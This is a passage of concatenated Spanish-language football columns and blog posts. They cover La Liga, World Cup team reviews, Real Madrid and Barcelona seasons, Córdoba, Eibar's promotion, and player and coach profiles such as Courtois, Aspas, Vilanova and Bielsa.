desmembradas. De aquellos polvos, estos lodos. De aquellos polvos, estos húmedos sueños.Es tan impredecible el fútbol y son tan largos los domingos tras los pobres empates. Hay un abismo entre el Barcelona y sus perseguidores. Marcelino, entrenador del Villarreal, dijo anoche en Radio Marca algo parecido a que el Madrid tiene jugadores pero no equipo y que el Atlético tenía equipo pero no jugadores. Es un análisis cruel, pero preciso. Las dos amenazas del equipo catalán están lejos de ser una alternativa a su poder. Interpretan papeles secundarios ante la diva blaugrana. Pueden hacerse muchas cuentas. Muchas hipótesis, cábalas, sumas y restas. Todo es posible.Quizá el mejor jugador coreano de siempre, el pulmón del Manchester fue mucho más que el jugador estajanovista que vemos en la Premier, y más comprometido en labores creativas, fue el alma de la selección roja.El momento: el empate de Lee mediada la segunda parte de los cuartos de final, que entreabría la puerta a reeditar, en esta ocasión de forma merecida, el gran éxito de 2002. Grecia. Eliminada en la primera fase. Un partido ganado y dos perdidos, con dos goles marcados y cinco recibidos. Goleadores: Salpingidis y Torosidis.Lo mejor: excepto en el primer partido, estuvo siempre un punto por encima de lo mostrado en la Euro 08, y fue capaz incluso de irse al ataque en el segundo partido para remontarle a Nigeria.Lo peor: la baja calidad técnica del equipo, el excesivo respeto guardado en todo momento a una Argentina que no se jugaba nada, y la falta de confianza en Ninis.La estrella: viejo rockero, Giorgos Karagounis siguió dejando destellos de la clase que siempre ha atesorado.El momento: la ocasión de Georgios Samaras en el último partido, que hubiera acercado la clasificación para octavos.Nigeria. Eliminada en la primera fase. Un empate y dos derrotas, tres goles a favor y cinco en contra. Goleadores: Kalu Uche (2) y Yakubu.Lo mejor: la actuación del portero Enyeama frente a Argentina y durante gran parte del partido contra Grecia, un prodigio de reflejos. Lástima que la ensuciase por un error en el blocaje.Lo peor: el juego muy plomizo y encorsetado, falto de creatividad, y la tontería de Kaita en el segundo partido que hipotecó las posibilidades de las águilas verdes.La estrella: Vincent Enyeama. El guardameta del Hapoel, con cualidades naturales extraordinarias, fue el sostén de su equipo. Si mejora en el aspecto técnico puede tener sitio en algún buen club europeo.El momento: la increíble ocasión marrada por Yakubu en el partido contra Corea, a puerta vacía a dos metros de la línea de gol, que podía haber cambiado el destino de la selección. Hay que tener valor, poca cabeza, ganas de comer grada o directamente de que te den el pasaporte. Muy contadas veces los futbolistas critican veladamente el juego de su equipo cuando no les gusta, así que hay considerar una absoluta rara avis estas declaraciones de Daniel Agger, en las que no solamente cuestiona el modo de jugar que le propone su entrenador, sino que se lanza y –aunque más tarde matiza un poco- se muestra dispuesto a desobeceder sus órdenes. Rajada en toda regla es poco.La verdad es que uno no entiende muy bien el motivo de tales declaraciones. Si está descontento con el juego del equipo, ¿por qué no hablarlo en privado con el míster? La represalia del mismo, que debe defenderse de algún modo, es completamente lógica y normal, y poco podemos esperar ver a Agger en el futuro si Hodgson quiere conservar algo de autoridad. Dos motivos vienen a la mente: o bien el jugador está enfrentado a su entrenador y ve tan perdido su puesto que todo le da igual y desea forzar un posible traspaso, o está recogiendo el sentir de parte del vestuario en un momento en que, dado el dubitativo comienzo de temporada del  Liverpool, la posición del preparador es de debilidad. En cualquier caso, unas frases tan llamativas como inusuales. Comenzaban los octavos del mundial de México ’86, estrenándose de este modo un formato que por exitoso y emocionante ha pervivido hasta nuestros días, y se enfrentaban el anfitrión y Bulgaria en el incomparable escenario del Estadio Azteca. Acercándose el final de la primera, el medio Manuel Negrete lanzó una pared en el área, y cuando le llegó la devolución a demasiada altura, enganchó una media tijera violenta y seca, de plasticidad incomparable, que entró como un tiro en la meta de Mikhailov y que hubiera sido el gol del Mundial de no ser por Maradona. En cualquier caso, un buen símbolo de lo alegre y fresca que fue aquella Copa del Mundo y del buen papel de México en ella tanto dentro como fuera de los terrenos de juego. Curiosamente, en la tanda de penaltis contra Alemania Federal fue Negrete el único que acertó a batir a Schumacher. Valoración general de la temporada. Deportivamente, el Real Madrid ha firmado una de las temporadas más brillantes de su larga historia. Aparte de los famosos récords de goles y puntos, de la sensación de superioridad que ha producido el equipo durante gran parte de la temporada y de la capacidad de ganar en las mejores y en las peores circunstancias, lo que ha distinguido este año al Madrid de otras versiones exitosas anteriores es su extrema competitividad.Hasta que el Granada gane la Liga sería posible con la calculadora en la mano. Pero las sensaciones son las que son: el campeonato está finiquitado. El Barcelona no da muestras de cansancio y sus seguidores sí. Hace falta más que un ex jugador laureado para revertir una situación de decrepitud institucional.El Madrid necesita aire fresco. Afinar las decisiones. Benítez fue un error. Lo de la Copa fue un error. La no contratación de De Gea fue un error. Es indefendible la gestión en un club que pretende ser referencial no solo en lo deportivo sino en la marca y el savoir-faire. Se van sumando méritos en el currículo. La plantilla no está compensada –se pelean los puestos ocho centrocampistas y no hay recambio de garantías para los centrales-, se acumulan las lesiones – ¿de verdad es casual que la enfermería blanca esté tan colapsada este año? - . El Madrid lleva un luto color leche. Este año no está saliendo nada, se ha cambiado la ruta a mitad de camino, como el GPS que te pide que des la vuelta cuando creías que habías elegido la salida correcta.El efecto Zidane parecía un detonador, la explosión ACME del coyote que lo ponía en órbita. La repercusión ha sido menor de la esperada. Rápida como un triquitraque contra la pared. Se han perdido puntos y se ha vuelto al juego ramplón que se pretendió erradicar. No ha dado tiempo ni de limpiar la Cibeles, ni de poner a enjuagar el capote. El fútbol no hace prisioneros, que se lo digan a un Kovacic superado o a un Bale cuestionado desde que aterrizó en Madrid.Kameni paró un penalti a Cristiano. Son cosas que pasan. Desde luego no es el primero que para, pero tras esa pena máxima se derrumbó el castillo de naipes que había erigido Florentino Pérez con cándida dedicación. Zidane demostrará lo que vale como entrenador la temporada que viene, con un verano por delante para asentar las bases de un equipo frágil. Mientras tanto toca luchar a la desesperada por una Liga que tiene nombre y una Champions que, como va siendo habitual, es el calmante espiritual de un club al que últimamente se le hacen largos los torneos de la regularidad. Imagen: Ángel Martínez en www.realmadrid.com Sólo hay una cosa por encima del fútbol: el amor. Amar es más divertido, excitante y arrebatador que un partido de fútbol. Quizá más doloroso, pero los valientes estamos acostumbrados a sentir las punzadas en mitad del pecho. Gracias al amor seguí la intrascendente liga eslovaca durante más de un año, fui de un equipo alemán unos meses, vi los partidos de Ucrania como si me fuera la vida en ellos, casi lloré por el descenso del Depor y hoy celebro la clasificación de Bélgica. Detrás de cada estúpido y antinatural episodio de identificación con colores que no son los míos hay una chica con la que compartí cerveza y mimos delante de una pantalla de televisión que vomitaba el color esmeralda del césped. Empiezo por el final, que es lo de Bélgica. La vida va y viene y me reencontré hace poco con una amiga que hace años fue mucho más que una amiga y que lleva unos años viviendo y trabajando en Bruselas. Hablamos un poco de todo y también de fútbol. Le pedí que me explicara cómo iba todo por allí. Me habló del Anderlecht, para mí el paradigma de club soso y al que creo imposible cogerle cariño, y del Brujas y poco más. En cuanto a clubes, poca chicha. Pero eso sí, cuando empezamos a hablar de la Selección ya no pudo parar. Fellaini, Hazard, Lukaku… la lista era apetecible. Paladeaba cada nombre como si de verdad se hubiera convertido a la fe de los diablos rojos. Bélgica aún no estaba clasificada para el Mundial pero tenía buena pinta.Hablamos tras lo de Croacia el otro día. Me reí un poco de los hermanos Mpenza, pero ella sabe mi amor por Preud´homme, aquel portero despeinado y felino que adoré en USA 94 y al que seguí como pude en mi adolescencia. No había internet. Así que Preud´homme, a veces, simplemente aparecía en una Recopa o algo así. Son recuerdos vagos pero tengo memorizada su camiseta y algunas de sus paradas. No hay ídolos como los de antes. O mejor: ya no se idolatra como antes. A cuenta de Preud´homme también hablamos de Pfaff, al que he visto en videos. Con Butragueño. Vídeos que duelen. Pensé en Bélgica llegando a un Mundial como una metáfora de un amor imposible, como éste que después de muchos años nos reencuentra a ella y a mí. Aunque hablemos de fútbol y eludamos los temas importantes.La conversación acabó con Courtois. “Me encanta ese portero”, confesé. Creo que está entre los tres mejores del mundo.El primero es Valdés, el segundo no los sé, y el tercero es Courtois. Reía con mi ocurrencia. Hacer reír a una mujer es lo mejor que puede pasarme. Porque hacerla llorar es mezquino y provocar su indiferencia es lo habitual, sobre todo los fines de semana. Leo después que Courtois dice estar entre los cinco mejores del mundo. No es vanidad, es asumir algo indiscutible. Es un portero que hará historia, si el Chelsea se lo permite. Siempre pensé en la buena gestión del club londinense con este portero. Cech lleva dos años terribles. Inseguro, intermitente y envejecido. Courtois está rindiendo a nivel estelar en el Atlético. Pero ahí sigue la cesión. Apurar tanto al checo para que el año que viene Courtois llegue hecho un dulce bajo los palos blue.La Selección de Bélgica llega al Mundial tras doce años. El amor vuelve tras unos pocos años en blanco. Courtois tiene futuro. Un futuro esperanzador. No como ella y yo. Nosotros ya no pensamos en el futuro. Hablamos de fútbol para evitar los temas importantes. Por miedo al fracaso, como si fuéramos vulgares jugadores croatas. Dice Guardiola que este partido es el más importante del año. Apuesto a que dirá lo propio en el doble enfrentamiento de semifinales y en la previa de la final, si llega, o lo dirá el jueves del partido contra el Madrid en Liga. Su estrategia para condensar toda la concentración del equipo en 90 minutos tiene una explicación obvia: la plantilla está tan mermada que los brillantes automatismos del cuadro culé flaquearan por los bailes obligados en la alineación. A veces un mal partido se suple con el oficio, no será el caso de esta noche donde dos equipos que destacan por su juego compacto tendrán que confiar en no habituales, buscar vías alternativas o dejar que lo impredecible reine sobre el césped.Eso hace más atractivo el choque. Si en la ida todos apostábamos por un partido de contención, con un mar en calma que sólo se agitaría con las individualidades de sus respectivas estrellas, para la vuelta nadie puede hacer una predicción sin arriesgarse. La titularidad de Bojan, la inédita pareja de centrales, o la versatilidad de algunas piezas como Maxwell o Touré convertirán los cuartos de final en un espectáculo inesperado. El rival está en condiciones parecidas, sin Gallas, Cesc o Arshavin el equipo de Wenger pierde a un hombre clave por línea. Ambas plantillas son cortas y los técnicos son de los que confían en un bloque fijo y no juegan demasiado con el fondo de armario, máxime tratándose de un choque clave como este.Los dedos señalan como jugadores obligados a marcar la diferencia a Messi y Nasri. Del primero hay que decir poco vista la temporada que lleva. Apartando el debate artificial sobre si es mejor o peor que Maradona –digamos que las comparaciones, siempre subjetivas, deben hacerse entre dos carreras concluidas y no con una en pleno rendimiento- el delantero argentino está demostrando que es el mejor jugador del mundo en este momento. El más desequilibrante, el más goleador, el imprescindible en un equipo de ensueño como este Barça. El francés Nasri nos recordó frente al Oporto en la ronda previa que sigue siendo aquel jugador que maravilló en el Marsella. Sin la creatividad de Fábregas y la movilidad de Arshavin, Samir debe asumir la responsabilidad de balancear al equipo y percutir la impredecible pareja de centrales de los catalanes.Hay otros jugadores que pueden ser importantes, Walcott en los gunners y Bojan en el Barcelona, por nombrar a dos jugadores de ataque.De ellos depende buena parte de la eliminatoria, de sus goles y su velocidad, de esa forma que tienen ambos de aparecer cuando menos se los espera. Guardiola y Wenger, amantes de lo preciso, del estudio pormenorizado del rival, tendrán hoy que sacudirse el academicismo y solventar un choque capital en sus respectivos equipos jugando, para fortuna del aficionado, desde el capricho y lo inesperado. Las cosas valen en presente. El valor emocional es un vínculo artificial e impostado. Queremos estar unidos al pasado a través de los objetos y los observamos como quien abre una ventana y se asoma a lo que tuvimos, a lo que fue. Discuto con mi madre a menudo sobre su Diógenes sentimental, sobre todos esos libros viejos que guarda en casa y ya no lee nadie. Sobre la ropa de cuando éramos pequeños, bisutería ennegrecida, figuritas de decoración que inundan el mueble-bar, recuerdos de viajes de hace muchos años. Cada objeto representa un recuerdo. Convertir el hogar en un santuario de lo que ya no vale nada sólo por el hecho de lo que significó, mucho tiempo atrás. El sábado pasado pensaba, mientras ocupaba mi asiento en El Arcángel, en lo necesario que es ver el fútbol sin pensar en el pasado, en lo que fuimos. Como si el césped fuera una puerta a lo que vendrá. Desde cero, desde la más absoluta y cándida ignorancia. “Volveremos” es un lema muy utilizado por el cordobesismo. Hay en esa palabra un asunción de que cualquier tiempo pasado fue mejor. El otro día lo puse en Twitter antes de dirigirme al estadio, un “Volveremos” mayúsculo, conforme, grandioso. Un canto de guerra. Un amigo periodista, A.D. Jiménez, me dijo que no hay que volver a nada, que siempre tenemos que estar ahí como aficionados, ya sea en Primera, Segunda o Segunda B, tres categorías que el Córdoba ha pisado en los últimos diez años. Y quizá tenga razón. Me sentí como mi madre, acumulando recuerdos del pasado para que el presente duela menos. Agarrado a la categoría que perdimos por méritos propios la temporada pasada. ¿Volver a qué? , pensé. ¿Volver al penalti fallado por Abraham Paz? ¿Volver al playoff frustrado contra el Valladolid? ¿Volver a los pitos a Xisco? ¿Volver a Fede Cartabia mandándonos callar mientras calentaba en la banda? . “Juntos hemos caído, juntos nos levantaremos” decía el espectacular tifo desplegado por la Peña Incondicionales en el Fondo Norte.El Córdoba ganó al Valladolid en el estreno liguero. Fue un partido disputado, exigente, con pocas ocasiones pero mucho hostigamiento visitante. La grada tenía ganas de fútbol. Se notó en el ánimo de los jugadores. Y fue momento de pensar en lo que viene. Jugadores que el año pasado apenas contaban se reencontraron con el balón. López Silva volvió a ser un interior incisivo, Luso aportó seriedad al centro del campo y estuvo en todas y Xisco bajó a recibir, desbordó, se peleó con todos los defensas y, sobre todo, fue coreado por el estadio. Un jugador al que el año pasado no se le perdonaban ni los andares salió aplaudido al ser sustituido en la segunda parte.Quizá sólo por eso ya merece abonarse a lo que viene, a un futuro tan impredecible como ilusionante. Al Córdoba aún le quedan cuarenta y un partidos para saber a qué hemos estado jugando, si a subir o a salvarnos. 42 partidos tiene la Liga Adelante, tantos como años costó volver a la división de oro de nuestro fútbol. Lo que está claro es que la herida de la Primera se ha cerrado y que buena parte de la afición ha decidido empezar de cero. Sin nostalgias ni lamentos. Sin rencores ni venganzas. No hay que volver a ningún sitio, sólo hay que mirar adelante. Como si mi madre, en una mañana de locura, tirara las figuritas del mueble, diera la ropa a la caridad e hiciera limpieza de su pasado. Fui al Bernabéu a ver al Córdoba el pasado lunes. Uno de miles.Sólo una ronda de penaltis separó al equipo blanco del binomio campeón de Liga/finalista Copa de Europa, un hito que en Concha Espina no se vive desde 1964, y que habla del extraordinario nivel de la escuadra madridista.También es destacable el descenso de ruido generado por el propio club, en general, y por Mourinho en particular –debido en parte, seguramente, a la buena marcha del equipo-. El dedo en el ojo marcó un máximo de ignominia, pero a partir de entonces los episodios indeseables protagonizados por miembros del club han remitido en frecuencia y gravedad, toda una bendición tanto para el público como para la propia institución. La decisión de Mourinho de dejar todo el protagonismo mediático a Karanka, que habla mal del autocontrol del portugués y produjo un terremoto de improperios entre el periodismo, también colaboró decisivamente en la tranquilidad con la que se ha acabado desarrollando la temporada. En este contexto sólo siguen sobrando los exabruptos de Paramés, quien por cierto no está vinculado al Madrid.Sin embargo, más allá del éxito deportivo o la calma mediática, lo que representa una excepción importante y un cambio clave respecto a los turbulentos años anteriores es que el Madrid, a través de Mourinho, ha encontrado una estabilidad. Sea porque realmente piensa que es el hombre, sea porque lo haya visto como una última oportunidad, Florentino ofreció desde el primer momento a su entrenador un margen de maniobra y un apoyo incondicional que jamás había otorgado a nadie, y que raramente se ha observado en la historia del club blanco. Esta línea de actuación le ha deparado ataques de todo tipo, tanto de grupos mediáticos como de los múltiples sujetos que siempre aspiran a su cuota de poder en el Madrid, pero también una gran recompensa, en forma de unos resultados deportivos que hablan por sí solos. Por primera vez en mucho tiempo, parece que en el Madrid existe una línea de actuación coherente a medio plazo, y el aficionado tiene derecho a contemplar el futuro con cierto optimismo. Ese es el gran logro de la temporada.Momento especial. Tanto por su importancia inmediata como por su valor simbólico a varios niveles, el momento clave de la temporada es el tanto de Cristiano Ronaldo en el Camp Nou. Impotancia inmediata, por cuanto que volvía a inclinar la balanza en el momento más delicado del partido más decisivo, en un Estadi enfebrecido que durante minutos vislumbró la remontada. Los símbolos están claros: la alegoría del juego en el que más cómodo se siente el equipo blanco, vertical, preciso y veloz; la ortodoxia pura, con el mejor pasador y el mejor goleador exhibiendo sus dones en grado máximo; y, sobre todo, el Madrid venciendo en su feudo al máximo rival, derribando un muro liguero que duraba muchos años, y escenificando el cambio de jerarquía en el mejor momento posible. Una Liga que, sin esa victoria, no hubiera sabido igual entre su afición.Jugador decisivo. Mientras los partidos de fútbol se sigan decidiendo por número de goles, si hay un tipo que marca 46 en una temporada el título de jugador más decisivo está otorgado, y es que el rendimiento de Cristiano Ronaldo ha rozado los límites de lo sobrenatural. Paradójicamente, y ametralladora aparte, lo que más se ha destacado de su ejercicio ha sido su mejora en los conceptos colectivos, incluyendo un juego más asociativo y una disponibilidad mayor para la asistencia. Aparte de ello, Cristiano ha desterrado definitivamente el tópico de que desaparecía en los grandes partidos, haciendo goles en todas las circunstancias posibles. Así, excepto al Dinamo Zagreb, CR le ha marcado a todos los equipos con los que se ha enfrentado el Madrid esta temporada, ha mojado en todas las rondas de Copa y Champions, incluyendo dos goles al Bayern en semifinales, y se ha quitado la espina que tenía con el Barça, al que ha hecho cuatro tantos en seis partidos. Un annus mirabilis.Jugador decepción. Se puede definir la decepción como un cociente pequeño entre lo que uno espera y lo que acaba obteniendo, y en ese sentido la temporada de Nuri Sahin en Chamartín ha resultado paradigmática. La gran esperanza de encontrar un sustituto de Xabi Alonso –el problema más acuciante del Madrid en el corto plazo-, mejor jugador de la Bundesliga el pasado año y motor del campeón se ha diluido en una espiral de lesiones, oscurantismo, desconfianza y actuaciones banales cuando Mourinho ha decidido otorgarle galones en el medio. En otro tiempo sería carne de traspaso; en éste, mucho más equilibrado y menos enloquecido, recibirá una segunda oportunidad para probar de blanco lo que ya demostró de amarillo, y que no se olvida en un año. Deberá esforzarse, porque será la última, y también porque, mirando el estímulo positivo, la recompensa sería grandiosa.Jugador revelación. En un sentido estricto, esta categoría habría que dejarla desierta, porque no ha aparecido ningún futbolista en el Madrid que no contase a principios de temporada y se haya asentado de titular durante la misma. Podría mencionarse en este apartado la enorme temporada de Ramos como central (posición desempeñada ya por el sevillano en 2006-07), que le destierra definitivamente del lateral derecho, o la explosión de Benzema, ya situado en el Olimpo de. los mejores jugadores del mundo. Sin embargo, si hay que elegir a un jugador joven de la plantilla que merezca el adjetivo “prometedor”, debemos mencionar a Raphaël Varane. No ha jugado demasiado, pero cuando lo ha hecho ha mostrado un aplomo y un empaque en el centro de la zaga anormales en un futbolista de 19 años. Su único y gran problema, el recorrido de la pareja Ramos-Pepe. Claves para la planificación y expectativas para la próxima temporada. El rendimiento ofrecido esta temporada por la plantilla del Real Madrid sugiere que este verano no debería necesitar más que un par de retoques en puestos concretos que parecen susceptibles de mejora. Por un lado, sería interesante para el Madrid incorporar a un centrocampista para acompañar a Xabi Alonso que, siendo potente en lo físico, mejore la prestación técnica de Khedira; máxime cuando Lass Diarra va a marcharse casi con toda seguridad. El otro lugar donde un fichaje sería deseable es el lateral derecho, donde una alternativa fiable y más ofensiva que Arbeloa podría resultar muy útil para dotar al equipo de una nueva alternativa. En cualquier caso, las expectativas del madridismo para la próxima temporada son altísimas, porque la percepcion es que este equipo debe aspirar ya de modo real a Liga y Champions League. Especialmente a esta última, la ansiada Décima. Dos nombres han destacado en la jornada de Serie A, que simbolizan en cierto modo las vías de ascenso y descenso en el fútbol y también en la vida. En la primera, siempre repleta de jóvenes en plenitud de fuerzas y llenos de optimismo, encontramos a Javier Pastore. El maleducado, como lo llamó Maradona por su descaro con el balón en los pies, es pieza codiciada desde hace meses por los grandes del fútbol europeo, y esta temporada ha explotado como uno de los mejores enganches del mundo –en una época, no lo olvidemos, pródiga en este tipo de futbolistas-. Pastore nos está malacostumbrando con la rosada del Palermo, a ritmo de exhibición semanal, y en el derby siciliano finiquitó casi sin ayuda al Catania con un hat-trick que resulta una alegoría de la variedad de sus recursos: un testarazo, un tanto con la derecha y otro con la zurda. Y lo mejor es que gran parte de la riqueza de su juego no se disfruta en un resumen, sino que hay que ver sus partidos completos. Sólo así se le aprecia en lo que vale.Di Natale es otra cosa. Delantero de explosión tardía, que recorrió clubes de segunda fila porque en el Empoli tardaron mucho en fiarse de él, no empezó a sonar hasta que el Udinese llamó a sus puertas, ya maduro. Allí formó parte –junto a Di Michele y Vincenzo Iaquinta– del tridente mágico que llevó a la Champions al modesto club friulano. Sus actuaciones en Udine le abrieron, de nuevo ya tarde, las puertas de una selección que le ha acabado dejando recuerdos agridulces: falló en la tanda contra España en la Euro 2008, y le marcó a Eslovaquia en el partido que privó a Italia de las últimas rondas del Mundial de Sudáfrica. La temporada pasada vivió una segunda juventud, pleno de experiencia y ya capitán del Udinese; ésta, con 33 años ya cumplidos, la había comenzado de forma gris, pero contra el Lecce recordó viejos tiempos y firmó un triplete que avisa de que todavía anda por ahí el bueno de Antonio. Y que sí, puede que el tren vaya de vuelta, pero todavía quedan estaciones por recorrer. Cuando dos equipos se enfrentan y la motivación de uno es mil veces la del otro, el resultado suele ser muy predecible. Seguramente los jugadores argentinos que han saltado hoy al Monumental tenían en la cabeza el fracaso reciente, el hecho de enfrentar al campeón, la motivación de un nuevo técnico e, incluso, la reivindicación de todo un estilo de juego. Si a esto le añadimos que los tres de arriba se llamaban Messi, Tévez e Higuaín, no suena nada raro el 2-0 en diez minutos, incluso si el adversario posee el empaque de la España actual. Y si además descubrimos que por fin la albiceleste juega con un centro del campo competente, comandado por un excepcional Mascherano y con Banega y Cambiasso dando la pausa que tanto faltó en el Mundial –¿cómo pudieron no estar en Sudáfrica?La selección estadounidense de Jermaine Jones, Michael Bradley, Graham Zusi, Clint Dempsey, Fabian Johnson, Tim Howard o Kyle Beckerman podría haber competido en carisma con aquel equipo del 94 y supongo que a partir de ahora cada vez me acordaré menos de la perilla de Alexi Lalas y más de las rastas de Beckerman y Jones. Algo más de trescientos minutos en partidos de liga y un único gol en Copa en su haber suponen sobrado argumento para concluir que el paso de Iago Aspas (Moaña, Pontevedra, 1987) por el Liverpool FC no alcanza el aprobado en su calificación global. Comenzó la temporada siendo habitual en los onces de Brendan Rodgers, pero poco a poco, y tras pasar unas semanas en el dique seco por una lesión muscular, fue desapareciendo del equipo hasta acabar convirtiendo su imagen vistiendo la emblemática camiseta red en un simple recuerdo lejano. El atacante gallego personifica como pocos el lado oscuro del éxodo de futbolistas españoles hacia el extranjero. No todo es bonito y no todo sale siempre bien. Era difícil prever que su salida del Celta, previo pago de nueve millones de euros por parte del Liverpool, terminaría por menoscabar su cotización y estancar su emergente carrera. Pero el paso de Aspas por Anfield es el más evidente ejemplo de que no siempre el salto a otro fútbol redunda en beneficio de una carrera deportiva. ‘Irme ahora sería un fracaso‘, vaticinaba el futbolista allá por el mes de enero como buscando sobreponerse a su complicada situación. Probablemente aún confiaba en brillar como jugador del Liverpool, o a eso pretendía aferrarse. Tenía que amortizar como fuese las lágrimas de su despedida de Balaídos.Pero Iago se encuentra ahora en una tesitura aún más complicada. Tras el fracaso de su primer año en Inglaterra (aún le quedan tres años más de contrato en Anfield) y la imposibilidad de concretar su regreso a Vigo en calidad de cedido por las notables diferencias económicas entre el salario del futbolista y lo que el club podía llegar a ofrecer, el atacante moañés ha optado por la vía del medio. Aspas aterriza ahora en Sevilla (cesión de un año con opción de compra) para tratar de abrirse hueco en un fútbol que ya conoce, de la mano de un entrenador, Unai Emery, que ya se deshace en elogios sobre él y recuperar su cotización en un equipo claramente al alza pero aún con importantes huecos por cubrir. Lejos de Balaídos, se me ocurren pocas plazas mejores para revitalizar su carrera. Metódico, minucioso y perfeccionista con su trabajo, dicen que Tito Vilanova (Bellcaire, 1968-Barcelona, 2014) dedicó los últimos días de su vida a preparar su propio entierro y a dejar los pocos flecos que le quedaban pendientes a su vida bien atados. Siempre tratando de desdramatizar, de alejar el foco y de huir de dar alimento al morbo insano. Es así como uno querría que todas las personalidades de renombre afrontasen sus últimos días. Desaparecido del mapa para librar la última batalla de su gran guerra contra ese tumor en la glándula parótida, esa en la que las fuerzas le abandonaron definitivamente, no supimos del extécnico del FC Barcelona hasta dos días antes de su fallecimiento. Fue el 25 de abril. La muerte de Tito fue el triste adiós del protagonista inesperado. De aquel invitado a la fiesta azulgrana de perfil discreto que llegó siendo prácticamente un desconocido y acabó convirtiéndose en el alma, espiritual y deportivamente hablando, del convite. Sin Vilanova, artífice del campeonato liguero de 2013, la transición en Can Barça quedó huérfana. Nadie excepto él parecía suficientemente capacitado para gestionar el cambio de ciclo azulgrana y la ruptura progresiva con los lazos del reciente pasado guardiolista, porque solo él parecía tener el secreto para prolongar la vigencia del ideario de Guardiola sin la presencia de éste. Meses después, el dolor por su pérdida sigue siendo patente. Las consecuencias deportivas de su ausencia, también. En el territorio de la emotividad más intensa, allí donde el Atlético de Madrid de Simeone se encuentra más cómodo y consigue desarrollar mejor su propuesta futbolística, se dirimió el pase a los cuartos de final de la Champions League entre colchoneros y Leverkusen. Respondiendo al guión previsto, arrimando el partido a la fogata encendida desde el graderío de la ribera del Manzanares (y desde la sala de prensa del Cerro del Espino) hasta rozarlo con las brasas incandescentes y hacerlo arder, el Atleti sacó adelante la eliminatoria con escaso fútbol pero aferrado a esa fuente de emociones extremas del que apela a un mismo tiempo al sentimiento de la grada, al recuerdo de Luis Aragonés y a la leyenda vida de Fernando Torres sobre el césped. Toda la imaginería colchonera junta y en perfecta emulsión.Porque los rojiblancos se manejan mejor cuanto menos fluido es el partido pero más cercano al éxtasis místico se encuentra. Y si la experiencia espiritual tiene su trance final apostado a la vuelta de la esquina de una tanda de penaltis, mejor que mejor. Dramatismo e histeria de la mano, bien cobijados bajo el manto de la ‘intensidad’, así como le gusta al Cholo. Si el plan funciona, si la estrategia de la hiperemotividad trae consigo un resultado victorioso, la foto lucirá extraordinaria a la mañana siguiente en las portadas. Pero las emociones son complicadas de gestionar y dominar. Siempre en el alambre, no es infrecuente que sean ellas las que, en una maniobra maquiavélica, acaben jugando con uno, manejándolo a su antojo entre vaivenes descontrolados y siempre próximos a las simas más profundas y a los picos más escarpados. Sin mesura y sin término medio, sin la virtud de la templanza. Es un riesgo muy grande el que asume el Atleti, tan poco dado a extraer su máximo rendimiento en climas templados, que necesitará de Koke, de Arda, de Griezmann, de Cani y, en definitiva, de una dosis bastante más generosa de fútbol para proseguir con garantías en su hazaña europea. ‘Tenemos dos retos importantísimos por delante: el del ascenso, en los terrenos de juego, y el de la ampliación de capital, fuera de ellos‘. Álex Aranzábal, presidente de la Sociedad Deportiva Eibar, puede dormir un 50% más tranquilo a partir de esta noche de veinticinco de mayo. Con dos jornadas aún por disputarse y tras vencer al Alavés en Ipurúa y no conseguir la UD Las Palmas la victoria ante el Recre en su propio estadio, el equipo guipuzcoano ha confirmado esta misma noche su ascenso matemático a la Liga BBVA, por vez primera en sus setenta y cuatro años de historia. El primero de los objetivos planteados por Aranzábal hace apenas una semana, el deportivo, ya está cumplido. Solo unos meses después de su ascenso desde Segunda división B, un nuevo ascenso. Esta vez hacia una dimensión desconocida.La SD Eibar cuenta con el presupuesto más bajo de toda la categoría de plata. Representa a una ciudad que no llega a los treinta mil habitantes. Disputa sus partidos como local en un estadio, Ipurúa, con un aforo de poco más de cinco mil espectadores. En su plantilla no destaca ninguna estrella y no hay un solo nombre con una mínima carga mediática… Pero es un club con un funcionamiento y una gestión ejemplares, sin deuda acumulada, al corriente de pagos. Un hito extraordinario en el fútbol profesional. Un club modélico.Sin embargo, y pese a dormir con el club como nuevo equipo de Primera división, el sueño de Álex Aranzábal no será aún plenamente tranquilo. La necesaria ampliación de capital a la que debe hacer frente el club armero mantiene a su presidente en vilo. Resulta paradójico, en un club saneado como el Éibar, que la normativa pueda dar con la institución de nuevo en Segunda B sino consigue cumplir con las exigencias marcadas por el Real Decreto 1251/1999 sobre Sociedades Anónimas Deportivas.Pero lo cierto es que el artículo 3 de la citada norma exige al club una ampliación de su actual capital social hasta alcanzar el mínimo establecido para las sociedades anónimas deportivas (que es el equivalente a la media del 25% de los presupuestos de los equipos de Segunda en las dos últimas temporadas, esto es, algo más de dos millones de euros). Si no consigue sumar accionistas y completar la operación antes de la fecha límite del seis de agosto, y la recaudación aún va por el medio millón de euros (el 30% de los 1,7 que requiere sumar), su meritorio ascenso se verá frustrado y volverá a dar con sus huesos en el pozo de la Segunda B. Por increíble que suene tener que hablar de un asunto así cuando apenas hace un par de horas que se ha confirmado el ascenso matemático de una entidad ejemplar y que se ha ganado el respeto de todo el mundo del fútbol. Disfruta, Eibar, porque pocos lo han merecido igual. Y ahora, denok batera, a por el segundo de los objetivos. ‘¿Es cierto eso de que el Vélodrome es un estadio tan caliente como dicen? ‘. Se lo pregunté el pasado verano a Guillaume, marsellés, hincha del OM y, para mayor significado de su afición, residente en París desde niño.’ Bueno, nos gusta animar a nuestro equipo y ayudar desde la grada… ¿es lo normal, no? ‘. Respuesta sin posibilidad de contrarréplica. Cualquiera se atreve a ponerle en duda a un marsellés que no, que lo normal no es que un estadio se encienda cada quince días como lo hace el coliseo de Marsella. Como si alguien hubiese abierto la espita de la bombona y, maliciosamente, hubiese deslizado su dedo pulgar sobre la rueda de un mechero. Es curioso que, en apariencia, no sean conscientes de lo que los hace realmente diferentes frente a otras hinchadas francesas.Guillaume, cuya única preocupación era la salida cantada de Mathieu Valbuena del equipo, no conocía a Marcelo Bielsa cuando se anunció su incorporación al Olympique. Tampoco le culpo de su ignorancia. La trayectoria errática del Loco, alejada casi siempre de los focos más luminosos del panorama futbolístico internacional, no lo convertía de entrada, y pese a lo controvertido de su figura, en un personaje mediáticamente identificable para un joven aficionado francés. Estoy seguro de que Guillaume supo quién era Marcelo Bielsa el día que el argentino decidió que ya era hora de poner los puntos sobre las íes, mes y medio después de su aterrizaje en el sur de Francia. La incendiaria rueda de prensa del pasado siete de agosto, en la que acusó al presidente marsellés, Vincent Labrune, de haber contraído compromisos con él aun siendo consciente de que no sería capaz de cumplirlos y en la que se quejó abiertamente de la anárquica política de contrataciones del club, supuso su carta de presentación hacia la afición del OM. Porque no hay nada que desee con más fuerza un aficionado al fútbol que llegue alguien que sea capaz de poner contra las cuerdas a sus dirigentes, de apretarles hasta el extremo y de decirles las cuatro cosas a la cara que él jamás 